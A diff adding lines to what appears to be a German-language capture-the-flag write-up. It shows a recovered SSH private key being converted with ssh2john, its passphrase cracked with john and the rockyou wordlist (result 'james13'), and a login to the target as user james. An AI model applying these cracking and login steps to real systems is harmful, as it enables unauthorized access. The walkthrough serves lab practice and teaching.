@@ -133,6 +133,25 @@ Also speichern wir uns diesen Key auf unseren system in einer datei. Aber wir m�
 <br>
 dafür benutze ich: `ssh2john`
 * Command: `ssh2john id_rsa > hash`<br>
+<br>
+Jetzt führen ich einen Hash Brute Force angriff aus:<br>
+<br>
+
+* Command: `john hash --wordlist=/usr/share/wordlists/rockyou.txt`
+
+  ### John Result:
+  ```
+  id_rsa:james13
+
+  1 password hash cracked, 0 left
+  ```
+  <br>
+  
+  * Command: 
+  
+  jetzt haben wir auch den schlüssel um uns auf denn SSH Server einzuloggen.<br>
+  Nun loggen wir uns ein mit: `ssh james@IP -id id_rsa`
+  
 
 
 
